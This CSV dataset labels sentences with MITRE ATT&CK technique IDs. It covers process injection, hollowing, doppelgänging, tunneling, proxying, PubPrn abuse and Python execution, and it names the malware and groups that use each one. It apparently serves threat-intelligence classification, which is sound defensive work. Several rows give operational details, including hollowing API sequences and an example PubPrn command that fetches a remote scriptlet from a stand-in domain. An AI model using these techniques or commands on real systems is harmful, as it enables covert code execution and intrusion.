,label_tec,label_subtec,tec_name,sentence
7865,T1057,T1057,Process Discovery,Winnti Group looked for a specific process running on infected servers.
7866,T1057,T1057,Process Discovery,APT3 has a tool that can list out currently running processes.
7867,T1057,T1057,Process Discovery,"After compromising a victim, Poseidon Group lists all running processes."
7868,T1057,T1057,Process Discovery,Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.
7869,T1057,T1057,Process Discovery,Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.
7870,T1057,T1057,Process Discovery,Ke3chang performs process discovery using tasklist commands.
7871,T1057,T1057,Process Discovery,Turla surveys a system upon check-in to discover running processes using the tasklist /v command.
7872,T1057,T1057,Process Discovery,Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.
7873,T1057,T1057,Process Discovery,Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server.
7874,T1057,T1057,Process Discovery,A Destover-like variant used by Lazarus Group also gathers process times.
7875,T1057,T1057,Process Discovery,Tropic Trooper is capable of enumerating the running processes on the system using pslist.
7876,T1057,T1057,Process Discovery,Stealth Falcon malware gathers a list of running processes.
7877,T1057,T1057,Process Discovery,Darkhotel malware can collect a list of running processes on a system.
7878,T1057,T1057,Process Discovery,Magic Hound malware can list running processes.
7879,T1057,T1057,Process Discovery,MuddyWater has used malware to obtain a list of running processes on the system.
7880,T1057,T1057,Process Discovery,An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.
7881,T1057,T1057,Process Discovery,Inception has used a reconnaissance module to identify active processes and other associated loaded modules.
7882,T1057,T1057,Process Discovery,"Frankenstein has enumerated hosts, looking to obtain a list of all currently running processes."
7883,T1057,T1057,Process Discovery,Rocke can detect a running process's PID on the infected machine.
7884,T1057,T1057,Process Discovery,Operation Wocao has collected a list of running processes on the infected system.
7885,T1057,T1057,Process Discovery,UNC2452 used multiple command-line utilities to enumerate running processes.
7886,T1057,T1057,Process Discovery,Chimera has used tasklist to enumerate processes.
7887,T1057,T1057,Process Discovery,Sidewinder has used tools to identify running processes on the victim's machine.
7888,T1057,T1057,Process Discovery,Higaisa’s shellcode attempted to find the process ID of the current process.
7889,T1057,T1057,Process Discovery,Windshift has used malware to enumerate active processes.
7890,T1057,T1057,Process Discovery,Mustang Panda has used tasklist /v to determine active process information.
7891,T1057,T1057,Process Discovery,APT29 has used multiple command-line utilities to enumerate running processes.
7892,T1057,T1057,Process Discovery,Andariel has used tasklist to enumerate processes and find a specific string.
7893,T1057,T1057,Process Discovery,TeamTNT searches for rival malware and removes them if found.
7894,T1055,T1055.013,Process Doppelgänging,Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges.
7895,T1055,T1055.013,Process Doppelgänging,Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.
7896,T1055,T1055.013,Process Doppelgänging,Windows Transactional NTFS  was introduced in Vista as a method to perform safe file operations.
7897,T1055,T1055.013,Process Doppelgänging,"To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time."
7898,T1055,T1055.013,Process Doppelgänging,"Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened."
7899,T1055,T1055.013,Process Doppelgänging,"To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction."
7900,T1055,T1055.013,Process Doppelgänging,"Although deprecated, the TxF application programming interface  is still enabled as of Windows 10."
7901,T1055,T1055.013,Process Doppelgänging,Adversaries may abuse TxF to a perform a file-less variation of Process Injection.
7902,T1055,T1055.013,Process Doppelgänging,"Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection."
7903,T1055,T1055.013,Process Doppelgänging,"Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext."
7904,T1055,T1055.013,Process Doppelgänging,"Process Doppelgänging is implemented in 4 steps :
* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code."
7905,T1055,T1055.013,Process Doppelgänging,These changes will be isolated and only visible within the context of the transaction.
7906,T1055,T1055.013,Process Doppelgänging,* Load – Create a shared section of memory and load the malicious executable.
7907,T1055,T1055.013,Process Doppelgänging,"* Rollback – Undo changes to original executable, effectively removing malicious code from the file system."
7908,T1055,T1055.013,Process Doppelgänging,* Animate – Create a process from the tainted section of memory and initiate execution.
7909,T1055,T1055.013,Process Doppelgänging,This behavior will likely not result in elevated privileges since the injected process was spawned from  of the injecting process.
7910,T1055,T1055.013,Process Doppelgänging,"However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process."
7911,T1055,T1055.013,Process Doppelgänging,SynAck abuses NTFS transactions to launch and conceal malicious processes.
7912,T1055,T1055.013,Process Doppelgänging,Bazar can inject into a target process using process doppelgänging.
7913,T1055,T1055.013,Process Doppelgänging,Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems.
7914,T1055,T1055.012,Process Hollowing,Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses.
7915,T1055,T1055.012,Process Hollowing,Process hollowing is a method of executing arbitrary code in the address space of a separate live process.
7916,T1055,T1055.012,Process Hollowing,"Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code."
7917,T1055,T1055.012,Process Hollowing,"A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread."
7918,T1055,T1055.012,Process Hollowing,"At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively."
7919,T1055,T1055.012,Process Hollowing,This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process.
7920,T1055,T1055.012,Process Hollowing,"However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process."
7921,T1055,T1055.012,Process Hollowing,Smoke Loader spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.
7922,T1055,T1055.012,Process Hollowing,Duqu is capable of loading executable code via process hollowing.
7923,T1055,T1055.012,Process Hollowing,BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.
7924,T1055,T1055.012,Process Hollowing,ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.
7925,T1055,T1055.012,Process Hollowing,Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload.
7926,T1055,T1055.012,Process Hollowing,"Azorult can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution."
7927,T1055,T1055.012,Process Hollowing,BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process.
7928,T1055,T1055.012,Process Hollowing,TrickBot injects into the svchost.exe process.
7929,T1055,T1055.012,Process Hollowing,Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload.
7930,T1055,T1055.012,Process Hollowing,"Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext."
7931,T1055,T1055.012,Process Hollowing,Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.
7932,T1055,T1055.012,Process Hollowing,Ursnif has used process hollowing to inject into child processes.
7933,T1055,T1055.012,Process Hollowing,Lokibot has used process hollowing to inject itself into legitimate Windows process.
7934,T1055,T1055.012,Process Hollowing,Cobalt Strike can use process hollowing for execution.
7935,T1055,T1055.012,Process Hollowing,"Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing."
7936,T1055,T1055.012,Process Hollowing,Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code.
7937,T1055,T1055.012,Process Hollowing,The NETWIRE payload has been injected into benign Microsoft executables via process hollowing.
7938,T1055,T1055.012,Process Hollowing,Dtrack has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%.
7939,T1055,T1055.012,Process Hollowing,QakBot can use process hollowing to execute its main payload.
7940,T1055,T1055.012,Process Hollowing,A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.
7941,T1055,T1055.012,Process Hollowing,A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process.
7942,T1055,T1055.012,Process Hollowing,menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.
7943,T1055,T1055.012,Process Hollowing,Gorgon Group malware can use process hollowing to inject one of its trojans into another process.
7944,T1055,T1055,Process Injection,Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.
7945,T1055,T1055,Process Injection,Process injection is a method of executing arbitrary code in the address space of a separate live process.
7946,T1055,T1055,Process Injection,Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.
7947,T1055,T1055,Process Injection,"There are many different ways to inject code into a process, many of which abuse legitimate functionalities."
7948,T1055,T1055,Process Injection,These implementations exist for every major OS but are typically platform specific.
7949,T1055,T1055,Process Injection,"More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication  mechanisms as a communication channel."
7950,T1055,T1055,Process Injection,JPIN can inject content into lsass.exe to load a module.
7951,T1055,T1055,Process Injection,JHUHUGIT performs code injection injecting its own functions to browser processes.
7952,T1055,T1055,Process Injection,Cardinal RAT injects into a newly spawned process created from a native Windows executable.
7953,T1055,T1055,Process Injection,Backdoor.Oldrea injects itself into explorer.exe.
7954,T1055,T1055,Process Injection,Wingbird performs multiple process injections to hijack system processes and execute malicious code.
7955,T1055,T1055,Process Injection,Wiarp creates a backdoor through which remote attackers can inject files into running processes.
7956,T1055,T1055,Process Injection,Smoke Loader injects into the Internet Explorer process.
7957,T1055,T1055,Process Injection,NavRAT copies itself into a running Internet Explorer process to evade detection.
7958,T1055,T1055,Process Injection,AuditCred can inject code from files to other running processes.
7959,T1055,T1055,Process Injection,HOPLIGHT has injected into running processes.
7960,T1055,T1055,Process Injection,StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser.
7961,T1055,T1055,Process Injection,HyperBro can run shellcode it injects into a newly created process.
7962,T1055,T1055,Process Injection,Gazer injects its communication module into an Internet accessible process through which it performs C2.
7963,T1055,T1055,Process Injection,"TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes."
7964,T1055,T1055,Process Injection,Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.
7965,T1055,T1055,Process Injection,"Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread."
7966,T1055,T1055,Process Injection,ABK has the ability to inject shellcode into svchost.exe.
7967,T1055,T1055,Process Injection,BBK has the ability to inject shellcode into svchost.exe.
7968,T1055,T1055,Process Injection,Avenger has the ability to inject shellcode into svchost.exe.
7969,T1055,T1055,Process Injection,Dyre has the ability to directly inject its code into the web browser process.
7970,T1055,T1055,Process Injection,gh0st RAT can inject malicious code into process created by the “Command_Create&Inject” function.
7971,T1055,T1055,Process Injection,InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.
7972,T1055,T1055,Process Injection,REvil can inject itself into running processes on a compromised host.
7973,T1055,T1055,Process Injection,Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.
7974,T1055,T1055,Process Injection,SLOTHFULMEDIA can inject into running processes on a compromised host.
7975,T1055,T1055,Process Injection,Bazar can inject code through calling VirtualAllocExNuma.
7976,T1055,T1055,Process Injection,"Agent Tesla can inject into known, vulnerable binaries on targeted hosts."
7977,T1055,T1055,Process Injection,Egregor can inject its payload into iexplore.exe process.
7978,T1055,T1055,Process Injection,"NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe."
7979,T1055,T1055,Process Injection,Waterbear can inject decrypted shellcode into the LanmanServer service.
7980,T1055,T1055,Process Injection,ShadowPad has injected an install module into a newly created process.
7981,T1055,T1055,Process Injection,GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state.
7982,T1055,T1055,Process Injection,GuLoader has previously used RegAsm as a donor process.
7983,T1055,T1055,Process Injection,"QakBot can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe."
7984,T1055,T1055,Process Injection,TrickBot has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe.
7985,T1055,T1055,Process Injection,HiddenWasp adds itself to the LD_PRELOAD path and sets a series of environment variables.
7986,T1055,T1055,Process Injection,injects a malicious DLL into the IExplorer.exe process.
7987,T1055,T1055,Process Injection,Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.
7988,T1055,T1055,Process Injection,Cobalt Group has injected code into trusted processes.
7989,T1055,T1055,Process Injection,"APT37 injects its malware variant, ROKRAT, into the cmd.exe process."
7990,T1055,T1055,Process Injection,PLATINUM has used various methods of process injection including hot patching.
7991,T1055,T1055,Process Injection,Honeybee uses a batch file to load a DLL into the svchost.exe process.
7992,T1055,T1055,Process Injection,Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.
7993,T1055,T1055,Process Injection,APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.
7994,T1055,T1055,Process Injection,Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.
7995,T1055,T1055,Process Injection,Sharpshooter has leveraged embedded shellcode to inject a downloader into the memory of Word.
7996,T1055,T1055,Process Injection,APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.
7997,T1055,T1055,Process Injection,"Operation Wocao has injected code into a selected process, which in turn launches a command as a child process of the original."
7998,T1001,T1001.003,Protocol Impersonation,Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts.
7999,T1001,T1001.003,Protocol Impersonation,"By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic."
8000,T1001,T1001.003,Protocol Impersonation,"Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity."
8001,T1001,T1001.003,Protocol Impersonation,HARDRAIN uses FakeTLS to communicate with its C2 server.
8002,T1001,T1001.003,Protocol Impersonation,"FakeM C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo!"
8003,T1001,T1001.003,Protocol Impersonation,messengers.
8004,T1001,T1001.003,Protocol Impersonation,"Additionally, some variants of FakeM use modified SSL code for communications back to C2 servers, making SSL decryption ineffective."
8005,T1001,T1001.003,Protocol Impersonation,Bankshot generates a false TLS handshake using a public certificate to disguise C2 network communications.
8006,T1001,T1001.003,Protocol Impersonation,KeyBoy uses custom SSL libraries to impersonate SSL in C2 traffic.
8007,T1001,T1001.003,Protocol Impersonation,BADCALL uses a FakeTLS method during C2.
8008,T1001,T1001.003,Protocol Impersonation,FALLCHILL uses fake Transport Layer Security  to communicate with its C2 server.
8009,T1001,T1001.003,Protocol Impersonation,"Okrum mimics HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests."
8010,T1001,T1001.003,Protocol Impersonation,"InvisiMole can mimic HTTP protocol with custom HTTP “verbs” HIDE, ZVVP, and NOP."
8011,T1001,T1001.003,Protocol Impersonation,SUNBURST masqueraded its network traffic as the Orion Improvement Program  protocol.
8012,T1001,T1001.003,Protocol Impersonation,TAINTEDSCRIBE has used FakeTLS for session authentication.
8013,T1001,T1001.003,Protocol Impersonation,"Cobalt Strike can mimic the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI."
8014,T1001,T1001.003,Protocol Impersonation,"Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption."
8015,T1001,T1001.003,Protocol Impersonation,Higaisa used a FakeTLS session for C2 communications.
8016,T1572,T1572,Protocol Tunneling,Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.
8017,T1572,T1572,Protocol Tunneling,Tunneling involves explicitly encapsulating a protocol within another.
8018,T1572,T1572,Protocol Tunneling,This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption .
8019,T1572,T1572,Protocol Tunneling,"Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet."
8020,T1572,T1572,Protocol Tunneling,There are various means to encapsulate a protocol within another protocol.
8021,T1572,T1572,Protocol Tunneling,"For example, adversaries may perform SSH tunneling , which involves forwarding arbitrary data over an encrypted SSH tunnel."
8022,T1572,T1572,Protocol Tunneling,Protocol Tunneling may also be abused by adversaries during Dynamic Resolution.
8023,T1572,T1572,Protocol Tunneling,"Known as DNS over HTTPS , queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets."
8024,T1572,T1572,Protocol Tunneling,Adversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.
8025,T1572,T1572,Protocol Tunneling,FLIPSIDE uses RDP to tunnel traffic from a victim environment.
8026,T1572,T1572,Protocol Tunneling,Ngrok can tunnel RDP and other services securely over internet connections.
8027,T1572,T1572,Protocol Tunneling,"Cobalt Strike uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS."
8028,T1572,T1572,Protocol Tunneling,"In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol."
8029,T1572,T1572,Protocol Tunneling,Industroyer attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.
8030,T1572,T1572,Protocol Tunneling,The QakBot proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.
8031,T1572,T1572,Protocol Tunneling,OilRig has used the Plink utility and other tools to create tunnels to C2 servers.
8032,T1572,T1572,Protocol Tunneling,Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as Ngrok and custom tool SSHMinion.
8033,T1572,T1572,Protocol Tunneling,Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.
8034,T1572,T1572,Protocol Tunneling,CostaRicto has set up remote SSH tunneling into the victim's environment from a malicious domain.
8035,T1572,T1572,Protocol Tunneling,Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure.
8036,T1090,T1090,Proxy,Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.
8037,T1090,T1090,Proxy,"Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion."
8038,T1090,T1090,Proxy,Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.
8039,T1090,T1090,Proxy,Adversaries can also take advantage of routing schemes in Content Delivery Networks  to proxy command and control traffic.
8040,T1090,T1090,Proxy,BADCALL functions as a proxy server between the victim and C2 server.
8041,T1090,T1090,Proxy,"HARDRAIN uses the command cmd.exe /c netsh firewall add portopening TCP 443 ""adp"" and makes the victim machine function as a proxy server."
8042,T1090,T1090,Proxy,A TYPEFRAME variant can force the compromised system to function as a proxy server.
8043,T1090,T1090,Proxy,Cardinal RAT can act as a reverse proxy.
8044,T1090,T1090,Proxy,XTunnel relays traffic between a C2 server and a victim.
8045,T1090,T1090,Proxy,Socksbot can start SOCKS proxy threads.
8046,T1090,T1090,Proxy,AuditCred can utilize proxy for communications.
8047,T1090,T1090,Proxy,Vasport is capable of tunneling though a proxy.
8048,T1090,T1090,Proxy,HOPLIGHT has multiple proxy options that mask traffic between the malware and the remote operators.
8049,T1090,T1090,Proxy,jRAT can serve as a SOCKS proxy server.
8050,T1090,T1090,Proxy,Dridex contains a backconnect module for tunneling network traffic through a victim's computer.
8051,T1090,T1090,Proxy,Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers.
8052,T1090,T1090,Proxy,Ursnif has used a peer-to-peer  network for C2.
8053,T1090,T1090,Proxy,ZxShell can set up an HTTP or SOCKS proxy.
8054,T1090,T1090,Proxy,PLEAD has the ability to proxy network communications.
8055,T1090,T1090,Proxy,TSCookie has the ability to proxy communications with command and control  servers.
8056,T1090,T1090,Proxy,Aria-body has the ability to use a reverse SOCKS proxy module.
8057,T1090,T1090,Proxy,SDBbot has the ability to use port forwarding to establish a proxy between a target host and C2.
8058,T1090,T1090,Proxy,Kessel can use a proxy during exfiltration if set in the configuration.
8059,T1090,T1090,Proxy,Ngrok can be used to proxy connections to machines located behind NAT or firewalls.
8060,T1090,T1090,Proxy,NETWIRE can implement use of proxies to pivot traffic.
8061,T1090,T1090,Proxy,SombRAT has the ability to use an embedded SOCKS proxy in C2 communications.
8062,T1090,T1090,Proxy,RainyDay can use proxy tools including boost_proxy_client for reverse proxy functionality.
8063,T1090,T1090,Proxy,Gazer identifies a proxy server if it exists and uses it to make HTTP requests.
8064,T1090,T1090,Proxy,FLIPSIDE is a simple proxy that creates an outbound RDP connection.
8065,T1090,T1090,Proxy,Turla RPC backdoors have included local UPnP RPC proxies.
8066,T1090,T1090,Proxy,APT41 used a tool called CLASSFON to covertly proxy network communications.
8067,T1090,T1090,Proxy,"Blue Mockingbird has used frp, ssf, and Venom to establish SOCKS proxy connections."
8068,T1090,T1090,Proxy,"Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally."
8069,T1090,T1090,Proxy,"Operation Wocao has used a custom proxy tool called ""Agent"" which has support for multiple hops."
8070,T1090,T1090,Proxy,Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.
8071,T1090,T1090,Proxy,Windigo has delivered a generic Windows proxy Win32/Glubteta.M.
8072,T1090,T1090,Proxy,Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure.
8073,T1090,T1090,Proxy,Wizard Spider has used a module named NewBCtestnDll64 as a reverse SOCKS proxy.
8074,T1055,T1055.008,Ptrace System Calls,Adversaries may inject malicious code into processes via ptrace  system calls in order to evade process-based defenses as well as possibly elevate privileges.
8075,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.
8076,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection involves attaching to and modifying a running process.
8077,T1055,T1055.008,Ptrace System Calls,"The ptrace system call enables a debugging process to observe and control another process , including changing memory and register values."
8078,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection is commonly performed by writing arbitrary code into a running process  then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute.
8079,T1055,T1055.008,Ptrace System Calls,"Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes’ memory ."
8080,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.
8081,T1055,T1055.008,Ptrace System Calls,Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.
8082,T1216,T1216.001,PubPrn,Adversaries may use PubPrn to proxy execution of malicious remote files.
8083,T1216,T1216.001,PubPrn,PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services.
8084,T1216,T1216.001,PubPrn,The script is signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe.
8085,T1216,T1216.001,PubPrn,"For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com."
8086,T1216,T1216.001,PubPrn,Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.
8087,T1216,T1216.001,PubPrn,"To do so, adversaries may set the second script: parameter to reference a scriptlet file  hosted on a remote site."
8088,T1216,T1216.001,PubPrn,An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct.
8089,T1216,T1216.001,PubPrn,This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.
8090,T1216,T1216.001,PubPrn,"In later versions of Windows , PubPrn.vbs has been updated to prevent proxying execution from a remote site."
8091,T1216,T1216.001,PubPrn,"This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP."
8092,T1216,T1216.001,PubPrn,"APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses."
8093,T1597,T1597.002,Purchase Technical Data,Adversaries may purchase technical information about victims that can be used during targeting.
8094,T1597,T1597.002,Purchase Technical Data,"Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services."
8095,T1597,T1597.002,Purchase Technical Data,Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.
8096,T1597,T1597.002,Purchase Technical Data,"Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches."
8097,T1597,T1597.002,Purchase Technical Data,"Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure."
8098,T1597,T1597.002,Purchase Technical Data,"Information from these sources may reveal opportunities for other forms of reconnaissance  or Search Open Websites/Domains, establishing operational resources  or Obtain Capabilities, and/or initial access  or Valid Accounts."
8099,T1059,T1059.006,Python,Adversaries may abuse Python commands and scripts for execution.
8100,T1059,T1059.006,Python,"Python is a very popular scripting/programming language, with capabilities to perform many functions."
8101,T1059,T1059.006,Python,Python can be executed interactively from the command-line  or via scripts  that can be written and distributed to different systems.
8102,T1059,T1059.006,Python,Python code can also be compiled into binary executables.
8103,T1059,T1059.006,Python,"Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O."
8104,T1059,T1059.006,Python,Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.
8105,T1059,T1059.006,Python,Keydnap uses Python for scripting to execute additional commands.
8106,T1059,T1059.006,Python,SpeakUp uses Python scripts.
8107,T1059,T1059.006,Python,Machete is written in Python and is used in conjunction with additional Python scripts.
8108,T1059,T1059.006,Python,KeyBoy uses Python scripts for installing files and performing execution.
8109,T1059,T1059.006,Python,PUNCHBUGGY has used python scripts.
8110,T1059,T1059.006,Python,PoetRAT was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.
8111,T1059,T1059.006,Python,MechaFlounder uses a python-based payload.
8112,T1059,T1059.006,Python,Bundlore has used Python scripts to execute payloads.
8113,T1059,T1059.006,Python,"CookieMiner has used python scripts on the user’s system, as well as the Python variant of the Empire agent, EmPyre."
8114,T1059,T1059.006,Python,Cobalt Strike can use Python to perform execution.
8115,T1059,T1059.006,Python,"TRITON was run as trilog.exe, a Py2EXE compiled python script that accepts a single IP address as a flag."
8116,T1059,T1059.006,Python,Pysa has used Python scripts to deploy ransomware.
8117,T1059,T1059.006,Python,DropBook is a Python-based backdoor compiled with PyInstaller.
8118,T1059,T1059.006,Python,Ebury has used Python to implement its DGA.
8119,T1059,T1059.006,Python,Bandook can support commands to execute Python-based payloads.
8120,T1059,T1059.006,Python,Chaes has used Python scripts for execution and the installation of additional files.
8121,T1059,T1059.006,Python,Turian has the ability to use Python to spawn a Unix shell.
8122,T1059,T1059.006,Python,Machete used multiple compiled Python scripts on the victim’s system.
8123,T1059,T1059.006,Python,Machete's main backdoor Machete is also written in Python.
8124,T1059,T1059.006,Python,"Dragonfly 2.0 used various types of scripting to perform operations, including Python scripts."
8125,T1059,T1059.006,Python,The group was observed installing Python 2.7 on a victim.
8126,T1059,T1059.006,Python,APT39 has used a command line utility and a network scanner written in python.
8127,T1059,T1059.006,Python,BRONZE BUTLER has made use of Python-based remote access tools.
8128,T1059,T1059.006,Python,Rocke has used Python-based malware to install and spread their coinminer.
8129,T1059,T1059.006,Python,APT29 has developed malware variants written in Python.
8130,T1059,T1059.006,Python,Kimsuky has used a Mac OS Python implant to gather data.
8131,T1059,T1059.006,Python,Operation Wocao's backdoors have been written in Python and compiled with py2exe.
